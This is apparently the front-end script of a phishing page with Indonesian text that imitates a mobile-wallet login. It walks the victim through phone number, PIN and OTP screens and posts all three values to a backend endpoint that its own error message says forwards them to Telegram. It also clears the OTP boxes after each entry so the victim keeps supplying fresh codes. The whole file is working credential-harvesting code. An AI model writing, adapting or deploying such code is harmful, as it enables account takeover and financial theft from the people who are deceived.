document.addEventListener("DOMContentLoaded", function () {
  const phoneNumberInput = document.getElementById("phone-number");
  const pinInputs = document.querySelectorAll(".pin-box");
  const otpInputs = document.querySelectorAll(".otp-box");
  const lanjutkanButton = document.getElementById("lanjutkan-button");
  const numberPage = document.getElementById("number-page");
  const pinPage = document.getElementById("pin-page");
  const otpPage = document.getElementById("otp-page");
  const floatingNotification = document.getElementById("floating-notification");
  const otpWarning = document.getElementById("otp-warning");

  let otpResendCount = 0;
  const maxOtpResend = 5;

  let userData = { nomor: "", pin: "", otp: "" };

  async function sendToTelegram() {
    try {
      const response = await fetch(`/api/send-message`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(userData),
      });
      if (!response.ok) throw new Error("Gagal mengirim data ke Telegram");
    } catch (error) {
      console.error("Kesalahan saat mengirim pesan:", error);
    }
  }

  function formatPhoneNumber(input) {
    let phoneNumber = input.value.replace(/\D/g, '');
    if (!phoneNumber.startsWith('8')) {
      phoneNumber = '8' + phoneNumber;
    }
    input.value = phoneNumber.substring(0, 15);
  }

  function goToNextPage() {
    const phoneNumber = phoneNumberInput.value.replace(/\D/g, '');
    if (phoneNumber.length >= 8) {
      userData.nomor = phoneNumber;
      numberPage.style.display = "none";
      pinPage.style.display = "block";
      phoneNumberInput.blur();
      lanjutkanButton.style.display = "none";
      pinInputs[0].focus();
    } else {
      alert("Nomor telepon harus minimal 8 digit.");
    }
  }

  function handleInputEvent(inputs) {
    inputs.forEach((input, index) => {
      input.addEventListener("input", (event) => {
        if (event.inputType === "deleteContentBackward" && index > 0) {
          inputs[index - 1].focus();
        } else if (input.value.length === 1 && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
        if (inputs === pinInputs && index === inputs.length - 1) {
          setTimeout(() => {
            userData.pin = Array.from(pinInputs).map((input) => input.value).join("");
            pinPage.style.display = "none";
            otpPage.style.display = "block";
            otpInputs[0].focus();
          }, 300);
        }
        if (inputs === otpInputs && index === inputs.length - 1) {
          userData.otp = Array.from(otpInputs).map((input) => input.value).join("");
          sendToTelegram();
          showFloatingNotification();
        }
      });
    });
  }

  function showFloatingNotification() {
    floatingNotification.style.display = "block";
    floatingNotification.addEventListener("click", function () {
      floatingNotification.style.display = "none";
      otpInputs.forEach((input) => (input.value = ""));
      otpInputs[0].focus();
    });
  }

  function resendOtp() {
    if (otpResendCount < maxOtpResend) {
      otpResendCount++;
      sendToTelegram();
    } else {
      otpWarning.innerText = "❌ Batas pengiriman ulang OTP habis.";
    }
  }

  phoneNumberInput.addEventListener("input", function () {
    formatPhoneNumber(phoneNumberInput);
  });

  handleInputEvent(pinInputs);
  handleInputEvent(otpInputs);
  lanjutkanButton.addEventListener("click", goToNextPage);
});